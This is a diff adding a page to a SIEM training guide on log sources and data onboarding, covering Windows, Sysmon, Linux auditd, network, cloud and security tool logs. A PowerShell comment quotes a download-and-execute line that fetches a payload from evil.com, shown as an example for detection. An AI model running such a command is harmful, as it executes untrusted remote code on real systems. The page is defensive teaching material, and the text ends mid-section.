@@ -1,0 +1,912 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Log Sources and Data Onboarding - Critical log sources for security monitoring including Windows, Linux, network, cloud, and security tools.">
+    <title>Log Sources & Data Onboarding | SIEM Mastery Guide</title>
+    <link rel="stylesheet" href="main.css">
+    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🛡️</text></svg>">
+</head>
+<body>
+    <div class="page-wrapper">
+        <button class="mobile-menu-toggle" aria-label="Toggle navigation menu">
+            <div class="hamburger"><span></span><span></span><span></span></div>
+        </button>
+        <div class="sidebar-overlay"></div>
+        
+        <aside class="sidebar">
+            <div class="sidebar-header">
+                <a href="index.html" class="sidebar-logo">
+                    <div class="logo-icon">🛡️</div>
+                    <div>
+                        <div class="logo-text">SIEM Mastery</div>
+                        <div class="logo-subtext">Documentation</div>
+                    </div>
+                </a>
+                <div class="sidebar-search">
+                    <span class="search-icon">🔍</span>
+                    <input type="text" placeholder="Search docs... (Ctrl+K)" aria-label="Search documentation">
+                </div>
+            </div>
+            
+                        <nav class="sidebar-nav">
+                <!-- Section 1: SIEM Fundamentals -->
+                <div class="nav-section expanded">
+                    <div class="nav-section-header">
+                        <span class="nav-section-title">
+                            <span class="nav-section-icon">📚</span>
+                            <span>SIEM Fundamentals</span>
+                        </span>
+                        <span class="nav-section-arrow">▶</span>
+                    </div>
+                    <div class="nav-section-items">
+                        <a href="1-1-introduction-to-siem.html" class="nav-item">1.1 Introduction to SIEM</a>
+                        <a href="1-2-architecture-components.html" class="nav-item">1.2 Architecture & Components</a>
+                        <a href="1-3-log-sources-onboarding.html" class="nav-item active">1.3 Log Sources & Onboarding</a>
+                        <a href="1-4-log-parsing-normalization.html" class="nav-item">1.4 Log Parsing & Normalization</a>
+                        <a href="1-5-detection-engineering-fundamentals.html" class="nav-item">1.5 Detection Engineering</a>
+                        <a href="1-6-soc-operations-siem.html" class="nav-item">1.6 SOC Operations & SIEM</a>
+                    </div>
+                </div>
+                
+                <!-- Section 2: Splunk Fundamentals -->
+                <div class="nav-section">
+                    <div class="nav-section-header">
+                        <span class="nav-section-title">
+                            <span class="nav-section-icon">🟢</span>
+                            <span>Splunk Fundamentals</span>
+                        </span>
+                        <span class="nav-section-arrow">▶</span>
+                    </div>
+                    <div class="nav-section-items">
+                        <a href="2-1-splunk-architecture.html" class="nav-item">2.1 Splunk Architecture</a>
+                        <a href="2-2-installation-configuration.html" class="nav-item">2.2 Installation & Configuration</a>
+                        <a href="2-3-data-ingestion.html" class="nav-item">2.3 Data Ingestion</a>
+                        <a href="2-4-index-management.html" class="nav-item">2.4 Index Management</a>
+                        <a href="2-5-spl-fundamentals.html" class="nav-item">2.5 SPL Fundamentals</a>
+                        <a href="2-6-spl-data-retrieval.html" class="nav-item">2.6 SPL Data Retrieval</a>
+                        <a href="2-7-spl-transforming.html" class="nav-item">2.7 SPL Transforming</a>
+                        <a href="2-8-spl-manipulation.html" class="nav-item">2.8 SPL Manipulation</a>
+                        <a href="2-9-spl-advanced.html" class="nav-item">2.9 SPL Advanced</a>
+                        <a href="2-10-search-optimization.html" class="nav-item">2.10 Search Optimization</a>
+                    </div>
+                </div>
+                
+                <!-- Section 3: Splunk Security Operations -->
+                <div class="nav-section">
+                    <div class="nav-section-header">
+                        <span class="nav-section-title">
+                            <span class="nav-section-icon">🔒</span>
+                            <span>Splunk Security Ops</span>
+                        </span>
+                        <span class="nav-section-arrow">▶</span>
+                    </div>
+                    <div class="nav-section-items">
+                        <a href="3-1-splunk-es-overview.html" class="nav-item">3.1 Enterprise Security Overview</a>
+                        <a href="3-2-notable-events.html" class="nav-item">3.2 Notable Events</a>
+                        <a href="3-3-correlation-searches.html" class="nav-item">3.3 Correlation Searches</a>
+                        <a href="3-4-risk-based-alerting.html" class="nav-item">3.4 Risk-Based Alerting</a>
+                        <a href="3-5-threat-intelligence.html" class="nav-item">3.5 Threat Intelligence</a>
+                        <a href="3-6-asset-identity.html" class="nav-item">3.6 Asset & Identity</a>
+                        <a href="3-7-security-dashboards.html" class="nav-item">3.7 Security Dashboards</a>
+                        <a href="3-8-es-administration.html" class="nav-item">3.8 ES Administration</a>
+                    </div>
+                </div>
+                
+                <!-- Section 4: Splunk SOAR -->
+                <div class="nav-section">
+                    <div class="nav-section-header">
+                        <span class="nav-section-title">
+                            <span class="nav-section-icon">⚡</span>
+                            <span>Splunk SOAR</span>
+                        </span>
+                        <span class="nav-section-arrow">▶</span>
+                    </div>
+                    <div class="nav-section-items">
+                        <a href="4-1-soar-overview.html" class="nav-item">4.1 SOAR Overview</a>
+                        <a href="4-2-playbooks.html" class="nav-item">4.2 Playbooks</a>
+                        <a href="4-3-apps-integrations.html" class="nav-item">4.3 Apps & Integrations</a>
+                        <a href="4-4-case-management.html" class="nav-item">4.4 Case Management</a>
+                    </div>
+                </div>
+                
+                <!-- Section 5: Microsoft Sentinel Fundamentals -->
+                <div class="nav-section">
+                    <div class="nav-section-header">
+                        <span class="nav-section-title">
+                            <span class="nav-section-icon">🔷</span>
+                            <span>Sentinel Fundamentals</span>
+                        </span>
+                        <span class="nav-section-arrow">▶</span>
+                    </div>
+                    <div class="nav-section-items">
+                        <a href="5-1-sentinel-architecture.html" class="nav-item">5.1 Sentinel Architecture</a>
+                        <a href="5-2-log-analytics.html" class="nav-item">5.2 Log Analytics Workspace</a>
+                        <a href="5-3-data-connectors.html" class="nav-item">5.3 Data Connectors</a>
+                        <a href="5-4-kql-fundamentals.html" class="nav-item">5.4 KQL Fundamentals</a>
+                        <a href="5-5-kql-advanced.html" class="nav-item">5.5 KQL Advanced</a>
+                        <a href="5-6-analytics-rules.html" class="nav-item">5.6 Analytics Rules</a>
+                        <a href="5-7-incidents-investigation.html" class="nav-item">5.7 Incidents & Investigation</a>
+                        <a href="5-8-workbooks-reporting.html" class="nav-item">5.8 Workbooks & Reporting</a>
+                    </div>
+                </div>
+                
+                <!-- Section 6: Sentinel Security Operations -->
+                <div class="nav-section">
+                    <div class="nav-section-header">
+                        <span class="nav-section-title">
+                            <span class="nav-section-icon">🔶</span>
+                            <span>Sentinel Security Ops</span>
+                        </span>
+                        <span class="nav-section-arrow">▶</span>
+                    </div>
+                    <div class="nav-section-items">
+                        <a href="6-1-automation-playbooks.html" class="nav-item">6.1 Automation & Playbooks</a>
+                        <a href="6-2-watchlists-ti.html" class="nav-item">6.2 Watchlists & Threat Intel</a>
+                        <a href="6-3-ueba.html" class="nav-item">6.3 UEBA</a>
+                        <a href="6-4-sentinel-administration.html" class="nav-item">6.4 Sentinel Administration</a>
+                    </div>
+                </div>
+                
+                <!-- Section 7: SIEM Comparison -->
+                <div class="nav-section">
+                    <div class="nav-section-header">
+                        <span class="nav-section-title">
+                            <span class="nav-section-icon">🔀</span>
+                            <span>SIEM Comparison</span>
+                        </span>
+                        <span class="nav-section-arrow">▶</span>
+                    </div>
+                    <div class="nav-section-items">
+                        <a href="7-1-splunk-vs-sentinel.html" class="nav-item">7.1 Splunk vs Sentinel</a>
+                        <a href="7-2-query-language-comparison.html" class="nav-item">7.2 SPL vs KQL</a>
+                        <a href="7-3-migration-considerations.html" class="nav-item">7.3 Migration Guide</a>
+                    </div>
+                </div>
+                
+                <!-- Section 8: Detection Engineering -->
+                <div class="nav-section">
+                    <div class="nav-section-header">
+                        <span class="nav-section-title">
+                            <span class="nav-section-icon">🎯</span>
+                            <span>Detection Engineering</span>
+                        </span>
+                        <span class="nav-section-arrow">▶</span>
+                    </div>
+                    <div class="nav-section-items">
+                        <a href="8-1-detection-development.html" class="nav-item">8.1 Detection Development</a>
+                        <a href="8-2-mitre-attack.html" class="nav-item">8.2 MITRE ATT&CK</a>
+                        <a href="8-3-sigma-rules.html" class="nav-item">8.3 SIGMA Rules</a>
+                        <a href="8-4-detection-testing.html" class="nav-item">8.4 Testing & Validation</a>
+                    </div>
+                </div>
+                
+                <!-- Section 9: Threat Hunting -->
+                <div class="nav-section">
+                    <div class="nav-section-header">
+                        <span class="nav-section-title">
+                            <span class="nav-section-icon">🔍</span>
+                            <span>Threat Hunting</span>
+                        </span>
+                        <span class="nav-section-arrow">▶</span>
+                    </div>
+                    <div class="nav-section-items">
+                        <a href="9-1-hunting-fundamentals.html" class="nav-item">9.1 Hunting Fundamentals</a>
+                        <a href="9-2-hunting-methodologies.html" class="nav-item">9.2 Hunting Methodologies</a>
+                        <a href="9-3-hunting-queries.html" class="nav-item">9.3 Hunting Queries</a>
+                    </div>
+                </div>
+                
+                <!-- Section 10: Use Case Library -->
+                <div class="nav-section">
+                    <div class="nav-section-header">
+                        <span class="nav-section-title">
+                            <span class="nav-section-icon">📁</span>
+                            <span>Use Case Library</span>
+                        </span>
+                        <span class="nav-section-arrow">▶</span>
+                    </div>
+                    <div class="nav-section-items">
+                        <a href="10-1-authentication-attacks.html" class="nav-item">10.1 Authentication Attacks</a>
+                        <a href="10-2-malware-execution.html" class="nav-item">10.2 Malware & Execution</a>
+                        <a href="10-3-data-exfiltration.html" class="nav-item">10.3 Data Exfiltration</a>
+                        <a href="10-4-insider-threats.html" class="nav-item">10.4 Insider Threats</a>
+                    </div>
+                </div>
+            </nav>
+            
+            <div class="sidebar-footer">
+                <p>Built for Security Engineers</p>
+            </div>
+        </aside>
+        
+        <main class="main-content">
+            <header class="content-header">
+                <nav class="breadcrumb">
+                    <a href="index.html">Home</a>
+                    <span class="breadcrumb-separator">/</span>
+                    <a href="1-1-introduction-to-siem.html">SIEM Fundamentals</a>
+                    <span class="breadcrumb-separator">/</span>
+                    <span class="breadcrumb-current">Log Sources & Onboarding</span>
+                </nav>
+            </header>
+            
+            <div class="content-area">
+                <h1 class="page-title">Log Sources & Data Onboarding</h1>
+                <p class="page-subtitle">Critical log sources for security monitoring and strategies for effective data onboarding</p>
+                
+                <div class="info-box overview">
+                    <div class="info-box-header">
+                        <span class="info-box-icon">📘</span>
+                        Chapter Overview
+                    </div>
+                    <div class="info-box-content">
+                        <p>
+                            Effective security monitoring requires visibility across your entire environment. This chapter covers the critical log sources every SIEM should ingest, what security value each provides, and practical guidance for prioritizing and onboarding data sources.
+                        </p>
+                    </div>
+                </div>
+                
+                <h2 id="prioritization">Log Source Prioritization Framework</h2>
+                
+                <p>
+                    Not all logs are equally valuable for security. Use this framework to prioritize onboarding:
+                </p>
+                
+                <div class="table-wrapper">
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>Priority</th>
+                                <th>Log Sources</th>
+                                <th>Detection Value</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td><strong>Critical (P1)</strong></td>
+                                <td>Authentication, EDR, Firewall, DNS, Proxy</td>
+                                <td>Core attack detection, immediate visibility</td>
+                            </tr>
+                            <tr>
+                                <td><strong>High (P2)</strong></td>
+                                <td>Windows Security, Cloud audit, VPN, Email security</td>
+                                <td>Lateral movement, privilege escalation, phishing</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Medium (P3)</strong></td>
+                                <td>Application logs, Database audit, DLP</td>
+                                <td>Data access, application attacks, exfiltration</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Lower (P4)</strong></td>
+                                <td>System logs, Debug logs, NetFlow</td>
+                                <td>Troubleshooting, forensic context</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+                
+                <div class="info-box best-practice">
+                    <div class="info-box-header">
+                        <span class="info-box-icon">✓</span>
+                        Best Practice
+                    </div>
+                    <div class="info-box-content">
+                        <p>
+                            Start with P1 sources to establish baseline detection capabilities. A SIEM with only authentication logs, EDR, and firewall data can detect most common attack patterns. Add P2-P4 sources incrementally based on risk assessment and compliance requirements.
+                        </p>
+                    </div>
+                </div>
+                
+                <h2 id="windows-logs">Windows Event Logs</h2>
+                
+                <p>
+                    Windows systems generate the richest endpoint telemetry in most enterprise environments. Key log channels:
+                </p>
+                
+                <h3>Security Log</h3>
+                
+                <p>
+                    The most critical Windows log for security monitoring. Contains authentication, authorization, and audit events.
+                </p>
+                
+                <div class="table-wrapper">
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>Event ID</th>
+                                <th>Description</th>
+                                <th>Security Value</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td><strong>4624</strong></td>
+                                <td>Successful logon</td>
+                                <td>Track user access, detect compromised accounts</td>
+                            </tr>
+                            <tr>
+                                <td><strong>4625</strong></td>
+                                <td>Failed logon</td>
+                                <td>Brute force detection, password spraying</td>
+                            </tr>
+                            <tr>
+                                <td><strong>4648</strong></td>
+                                <td>Explicit credential logon</td>
+                                <td>Credential theft, lateral movement</td>
+                            </tr>
+                            <tr>
+                                <td><strong>4672</strong></td>
+                                <td>Special privileges assigned</td>
+                                <td>Privileged account usage</td>
+                            </tr>
+                            <tr>
+                                <td><strong>4688</strong></td>
+                                <td>Process creation</td>
+                                <td>Command execution, malware detection</td>
+                            </tr>
+                            <tr>
+                                <td><strong>4720</strong></td>
+                                <td>User account created</td>
+                                <td>Persistence, unauthorized accounts</td>
+                            </tr>
+                            <tr>
+                                <td><strong>4728/4732/4756</strong></td>
+                                <td>Group membership changes</td>
+                                <td>Privilege escalation</td>
+                            </tr>
+                            <tr>
+                                <td><strong>4768/4769/4771</strong></td>
+                                <td>Kerberos authentication</td>
+                                <td>Golden ticket, Kerberoasting</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+                
+                <pre><code class="language-xml">&lt;!-- Enable command line auditing via GPO --&gt;
+&lt;!-- Computer Configuration → Policies → Administrative Templates → 
+     System → Audit Process Creation → Include command line --&gt;
+
+&lt;!-- Advanced Audit Policy Configuration --&gt;
+&lt;!-- Computer Configuration → Windows Settings → Security Settings → 
+     Advanced Audit Policy Configuration --&gt;
+
+Logon/Logoff:
+  Audit Logon: Success, Failure
+  Audit Logoff: Success
+  Audit Special Logon: Success
+
+Account Logon:
+  Audit Kerberos Authentication Service: Success, Failure
+  Audit Kerberos Service Ticket Operations: Success, Failure
+
+Detailed Tracking:
+  Audit Process Creation: Success</code></pre>
+                
+                <h3>PowerShell Logging</h3>
+                
+                <p>
+                    PowerShell is heavily abused by attackers. Enable comprehensive logging:
+                </p>
+                
+                <ul>
+                    <li><strong>Module Logging</strong> - Logs all module usage</li>
+                    <li><strong>Script Block Logging</strong> - Captures full script content (even obfuscated)</li>
+                    <li><strong>Transcription</strong> - Full session transcripts</li>
+                </ul>
+                
+                <pre><code class="language-powershell"># Enable via Group Policy or registry
+# Script Block Logging - Event ID 4104
+# Module Logging - Event ID 4103
+
+# Registry settings for Script Block Logging
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" `
+    -Name "EnableScriptBlockLogging" -Value 1
+
+# Example malicious PowerShell (what you'll detect):
+# Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')
+# This appears in Event ID 4104 even if encoded/obfuscated</code></pre>
+                
+                <h3>Sysmon</h3>
+                
+                <p>
+                    Sysmon extends Windows logging with detailed process, network, and file telemetry. Essential events:
+                </p>
+                
+                <div class="table-wrapper">
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>Event ID</th>
+                                <th>Description</th>
+                                <th>Detection Use Case</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td><strong>1</strong></td>
+                                <td>Process creation</td>
+                                <td>Full command line, parent process, hashes</td>
+                            </tr>
+                            <tr>
+                                <td><strong>3</strong></td>
+                                <td>Network connection</td>
+                                <td>C2 communication, lateral movement</td>
+                            </tr>
+                            <tr>
+                                <td><strong>7</strong></td>
+                                <td>Image loaded (DLL)</td>
+                                <td>DLL injection, hijacking</td>
+                            </tr>
+                            <tr>
+                                <td><strong>8</strong></td>
+                                <td>CreateRemoteThread</td>
+                                <td>Process injection</td>
+                            </tr>
+                            <tr>
+                                <td><strong>10</strong></td>
+                                <td>Process access</td>
+                                <td>Credential dumping (LSASS access)</td>
+                            </tr>
+                            <tr>
+                                <td><strong>11</strong></td>
+                                <td>File create</td>
+                                <td>Malware drops, persistence</td>
+                            </tr>
+                            <tr>
+                                <td><strong>13</strong></td>
+                                <td>Registry value set</td>
+                                <td>Persistence, configuration changes</td>
+                            </tr>
+                            <tr>
+                                <td><strong>22</strong></td>
+                                <td>DNS query</td>
+                                <td>C2 domains, DNS tunneling</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+                
+                <pre><code class="language-xml">&lt;!-- Example Sysmon config excerpt (use SwiftOnSecurity or Olaf config as base) --&gt;
+&lt;Sysmon schemaversion="4.90"&gt;
+  &lt;EventFiltering&gt;
+    &lt;!-- Log process creation --&gt;
+    &lt;ProcessCreate onmatch="exclude"&gt;
+      &lt;!-- Exclude noisy/low-value processes --&gt;
+      &lt;Image condition="is"&gt;C:\Windows\System32\backgroundTaskHost.exe&lt;/Image&gt;
+    &lt;/ProcessCreate&gt;
+    
+    &lt;!-- Log network connections --&gt;
+    &lt;NetworkConnect onmatch="exclude"&gt;
+      &lt;DestinationPort condition="is"&gt;80&lt;/DestinationPort&gt;
+      &lt;Image condition="is"&gt;C:\Program Files\Mozilla Firefox\firefox.exe&lt;/Image&gt;
+    &lt;/NetworkConnect&gt;
+    
+    &lt;!-- Always log LSASS access --&gt;
+    &lt;ProcessAccess onmatch="include"&gt;
+      &lt;TargetImage condition="is"&gt;C:\Windows\System32\lsass.exe&lt;/TargetImage&gt;
+    &lt;/ProcessAccess&gt;
+  &lt;/EventFiltering&gt;
+&lt;/Sysmon&gt;</code></pre>
+                
+                <div class="info-box interview">
+                    <div class="info-box-header">
+                        <span class="info-box-icon">💼</span>
+                        Interview Question
+                    </div>
+                    <div class="info-box-content">
+                        <p>
+                            <strong>"What's the difference between Windows Security Event 4688 and Sysmon Event 1?"</strong><br><br>
+                            Both log process creation, but Sysmon Event 1 provides richer data: process hash, parent process details, current directory, and more reliable command line capture. Sysmon also logs network connections per process (Event 3), which Windows Security logs don't provide. For mature detection, use Sysmon; for compliance or where Sysmon can't be deployed, 4688 with command line auditing is the fallback.
+                        </p>
+                    </div>
+                </div>
+                
+                <h2 id="linux-logs">Linux Logs</h2>
+                
+                <p>
+                    Linux logging varies by distribution but follows common patterns:
+                </p>
+                
+                <h3>Authentication Logs</h3>
+                
+                <pre><code class="language-bash"># Location varies by distro
+/var/log/auth.log      # Debian/Ubuntu
+/var/log/secure        # RHEL/CentOS
+
+# Key events to monitor
+sshd: Failed password for invalid user admin from 192.168.1.100 port 22
+sshd: Accepted publickey for ubuntu from 10.0.0.50 port 54321
+sudo: user : TTY=pts/0 ; PWD=/home/user ; USER=root ; COMMAND=/bin/bash
+su: pam_unix(su:session): session opened for user root by user(uid=1000)</code></pre>
+                
+                <h3>System Logs</h3>
+                
+                <pre><code class="language-bash"># Syslog - general system messages
+/var/log/syslog        # Debian/Ubuntu
+/var/log/messages      # RHEL/CentOS
+
+# Kernel logs - hardware, drivers, kernel-level events
+/var/log/kern.log
+dmesg
+
+# Package management
+/var/log/apt/          # Debian/Ubuntu
+/var/log/yum.log       # RHEL/CentOS</code></pre>
+                
+                <h3>Auditd</h3>
+                
+                <p>
+                    The Linux Audit System provides detailed syscall-level logging (similar value to Sysmon on Windows):
+                </p>
+                
+                <pre><code class="language-bash"># /etc/audit/rules.d/audit.rules
+
+# Log all executions
+-a always,exit -F arch=b64 -S execve -k exec
+
+# Log file access to sensitive files
+-w /etc/passwd -p wa -k identity
+-w /etc/shadow -p wa -k identity
+-w /etc/sudoers -p wa -k sudo_changes
+
+# Log privileged commands
+-a always,exit -F path=/usr/bin/sudo -F perm=x -k privileged
+-a always,exit -F path=/usr/bin/su -F perm=x -k privileged
+
+# Log network connections (requires additional tooling)
+-a always,exit -F arch=b64 -S connect -k network</code></pre>
+                
+                <h2 id="network-devices">Network Devices</h2>
+                
+                <p>
+                    Network infrastructure provides critical visibility into traffic patterns and threats:
+                </p>
+                
+                <h3>Firewalls</h3>
+                
+                <p>
+                    Next-generation firewalls provide rich security telemetry:
+                </p>
+                
+                <ul>
+                    <li><strong>Traffic logs</strong> - Allow/deny decisions, source/dest, ports</li>
+                    <li><strong>Threat logs</strong> - IPS alerts, malware detection</li>
+                    <li><strong>URL filtering logs</strong> - Web category, blocked sites</li>
+                    <li><strong>User-ID logs</strong> - Username to IP mapping</li>
+                </ul>
+                
+                <pre><code class="language-text"># Example Palo Alto Traffic Log
+TRAFFIC,2024/01/15 14:30:00,001234567890,TRAFFIC,end,2024/01/15 14:30:00,
+192.168.1.50,8.8.8.8,0.0.0.0,0.0.0.0,Allow-DNS,domain\user1,,dns,vsys1,
+trust,untrust,ethernet1/1,ethernet1/2,Log-Forward,2024/01/15 14:30:00,
+12345,1,53,53,0,0,0x0,udp,allow,150,150,0,1,2024/01/15 14:29:58,0,any,
+0,1234567890,0x0,192.168.0.0-192.168.255.255,US,0,1,0,n/a,0,0,0,0,,
+PA-5220,from-policy,,,0,,0,,N/A,0,0,0,0,1111-2222-3333-4444</code></pre>
+                
+                <h3>Web Proxies</h3>
+                
+                <p>
+                    Proxy logs reveal user web activity and potential data exfiltration:
+                </p>
+                
+                <pre><code class="language-text"># Example Squid/Zscaler log fields
+Timestamp, User, Source IP, Destination URL, HTTP Method, 
+Response Code, Bytes Sent, Bytes Received, Category, Action
+
+# Security-relevant patterns to detect:
+- Uncategorized sites (potential C2)
+- High data upload volumes
+- Connections to newly registered domains
+- Executable downloads
+- Encoded/obfuscated URLs</code></pre>
+                
+                <h3>DNS Logs</h3>
+                
+                <p>
+                    DNS is essential for detecting C2 communication and data exfiltration:
+                </p>
+                
+                <pre><code class="language-text"># Key DNS detection patterns:
+- Queries to known malicious domains (threat intel)
+- High entropy domain names (DGA detection)
+- Unusually long subdomain strings (DNS tunneling)
+- High volume of NXDOMAIN responses
+- TXT record queries (common for tunneling)
+- Queries to recently registered domains</code></pre>
+                
+                <div class="info-box warning">
+                    <div class="info-box-header">
+                        <span class="info-box-icon">⚠️</span>
+                        Warning
+                    </div>
+                    <div class="info-box-content">
+                        <p>
+                            DNS query logging can generate massive data volumes—often 10-100x more events than firewall logs. Consider sampling, filtering to external queries only, or using dedicated DNS security solutions that pre-analyze and only forward suspicious queries to SIEM.
+                        </p>
+                    </div>
+                </div>
+                
+                <h2 id="cloud-platforms">Cloud Platform Logs</h2>
+                
+                <p>
+                    Cloud environments require different log sources than on-premises:
+                </p>
+                
+                <h3>AWS</h3>
+                
+                <div class="table-wrapper">
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>Log Source</th>
+                                <th>Description</th>
+                                <th>Security Value</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td><strong>CloudTrail</strong></td>
+                                <td>API activity across AWS services</td>
+                                <td>Account compromise, privilege escalation, resource changes</td>
+                            </tr>
+                            <tr>
+                                <td><strong>GuardDuty</strong></td>
+                                <td>AWS threat detection findings</td>
+                                <td>Pre-built detections, ML-based anomalies</td>
+                            </tr>
+                            <tr>
+                                <td><strong>VPC Flow Logs</strong></td>
+                                <td>Network flow data</td>
+                                <td>East-west traffic, data exfiltration</td>
+                            </tr>
+                            <tr>
+                                <td><strong>S3 Access Logs</strong></td>
+                                <td>Object access audit</td>
+                                <td>Data access, bucket policy changes</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Config</strong></td>
+                                <td>Resource configuration changes</td>
+                                <td>Security misconfigurations, compliance drift</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+                
+                <pre><code class="language-json">// Example CloudTrail event - IAM user creation
+{
+  "eventTime": "2024-01-15T14:30:00Z",
+  "eventSource": "iam.amazonaws.com",
+  "eventName": "CreateUser",
+  "awsRegion": "us-east-1",
+  "sourceIPAddress": "203.0.113.50",
+  "userAgent": "aws-cli/2.0.0",
+  "userIdentity": {
+    "type": "IAMUser",
+    "userName": "admin-user",
+    "arn": "arn:aws:iam::123456789012:user/admin-user"
+  },
+  "requestParameters": {
+    "userName": "backdoor-user"
+  },
+  "responseElements": {
+    "user": {
+      "userName": "backdoor-user",
+      "userId": "AIDAEXAMPLE12345",
+      "createDate": "2024-01-15T14:30:00Z"
+    }
+  }
+}</code></pre>
+                
+                <h3>Azure</h3>
+                
+                <div class="table-wrapper">
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>Log Source</th>
+                                <th>Description</th>
+                                <th>Security Value</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td><strong>Entra ID Sign-in Logs</strong></td>
+                                <td>Authentication events</td>
+                                <td>Credential attacks, suspicious sign-ins</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Entra ID Audit Logs</strong></td>
+                                <td>Directory changes</td>
+                                <td>Privilege escalation, persistence</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Azure Activity Log</strong></td>
+                                <td>Control plane operations</td>
+                                <td>Resource changes, policy modifications</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Resource Logs</strong></td>
+                                <td>Service-specific logs</td>
+                                <td>Storage access, Key Vault operations</td>
+                            </tr>
+                            <tr>
+                                <td><strong>NSG Flow Logs</strong></td>
+                                <td>Network flow data</td>
+                                <td>Traffic analysis, anomaly detection</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+                
+                <h3>GCP</h3>
+                
+                <ul>
+                    <li><strong>Cloud Audit Logs</strong> - Admin activity, data access, system events</li>
+                    <li><strong>VPC Flow Logs</strong> - Network traffic metadata</li>
+                    <li><strong>Access Transparency Logs</strong> - Google staff access (Enterprise)</li>
+                </ul>
+                
+                <h2 id="security-tools">Security Tool Logs</h2>
+                
+                <h3>EDR (Endpoint Detection and Response)</h3>
+                
+                <p>
+                    EDR platforms provide pre-analyzed endpoint telemetry:
+                </p>
+                
+                <ul>
+                    <li><strong>Process events</strong> - Execution, injection, hollowing</li>
+                    <li><strong>Network events</strong> - Connections per process</li>
+                    <li><strong>File events</strong> - Creates, modifications, deletes</li>
+                    <li><strong>Detection alerts</strong> - Vendor-identified threats</li>
+                </ul>
+                
+                <p>Major platforms: Microsoft Defender for Endpoint, CrowdStrike Falcon, SentinelOne, Carbon Black, Cortex XDR</p>
+                
+                <div class="info-box tip">
+                    <div class="info-box-header">
+                        <span class="info-box-icon">💡</span>
+                        Integration Strategy
+                    </div>
+                    <div class="info-box-content">
+                        <p>
+                            Most organizations send EDR <strong>alerts</strong> to SIEM (low volume, high value) but keep raw telemetry in the EDR console. Full EDR telemetry can be 10-50GB/day per 1000 endpoints. If budget allows, sending process and network events enables powerful cross-source correlation.
+                        </p>
+                    </div>
+                </div>
+                
+                <h3>Identity and Access Management</h3>
+                
+                <ul>
+                    <li><strong>Okta</strong> - System log API for authentication, admin events</li>
+                    <li><strong>Ping Identity</strong> - Audit events</li>
+                    <li><strong>CyberArk</strong> - Privileged session activity</li>
+                    <li><strong>Active Directory</strong> - DC Security event logs</li>
+                </ul>
+                
+                <h3>Email Security</h3>
+                
+                <ul>
+                    <li><strong>Microsoft Defender for Office 365</strong> - Threat events, safe links/attachments</li>
+                    <li><strong>Proofpoint</strong> - Message disposition, threat analysis</li>
+                    <li><strong>Mimecast</strong> - Threat detection, URL protection</li>
+                </ul>
+                
+                <h3>DLP (Data Loss Prevention)</h3>
+                
+                <ul>
+                    <li><strong>Microsoft Purview</strong> - Policy matches, incidents</li>
+                    <li><strong>Symantec DLP</strong> - Detection events</li>
+                    <li><strong>Digital Guardian</strong> - Data movement events</li>
+                </ul>
+                
+                <h2 id="onboarding-process">Data Onboarding Process</h2>
+                
+                <p>
+                    Follow this structured process when onboarding new log sources:
+                </p>
+                
+                <h3>1. Discovery & Assessment</h3>
+                
+                <ul>
+                    <li>Identify available log sources and current logging configuration</li>
+                    <li>Estimate data volume (events/second, GB/day)</li>
+                    <li>Determine collection method (agent, syslog, API)</li>
+                    <li>Review existing SIEM connectors/add-ons</li>
+                </ul>
+                
+                <h3>2. Planning</h3>
+                
+                <ul>
+                    <li>Define retention requirements</li>
+                    <li>Plan index/table structure</li>
+                    <li>Identify parsing requirements</li>
+                    <li>Document network/firewall requirements</li>
+                    <li>Estimate cost impact</li>
+                </ul>
+                
+                <h3>3. Implementation</h3>
+                
+                <pre><code class="language-text">Onboarding Checklist:
+□ Configure source system logging (enable required events)
+□ Install/configure collection agent or connector
+□ Validate network connectivity (firewall rules, DNS)
+□ Configure parsing/field extraction
+□ Set up index/table with retention policy
+□ Verify data flow (test events received)
+□ Validate parsed fields are correct
+□ Configure relevant alerts/detections
+□ Create operational dashboards
+□ Document configuration and contacts</code></pre>
+                
+                <h3>4. Validation</h3>
+                
+                <ul>
+                    <li>Verify all expected event types are flowing</li>
+                    <li>Check field extraction accuracy</li>
+                    <li>Test detection rules fire correctly</li>
+                    <li>Validate timestamp parsing</li>
+                    <li>Confirm volume matches expectations</li>
+                </ul>
+                
+                <h3>5. Operational Handoff</h3>
+                
+                <ul>
+                    <li>Document the data source in SIEM catalog</li>
+                    <li>Create monitoring for data flow health</li>
+                    <li>Establish owner/contact for the source</li>
+                    <li>Train SOC on new data/detections</li>
+                </ul>
+                
+                <div class="info-box interview">
+                    <div class="info-box-header">
+                        <span class="info-box-icon">💼</span>
+                        Interview Question
+                    </div>
+                    <div class="info-box-content">
+                        <p>
+                            <strong>"You're starting a new SIEM deployment. What log sources do you onboard first and why?"</strong><br><br>
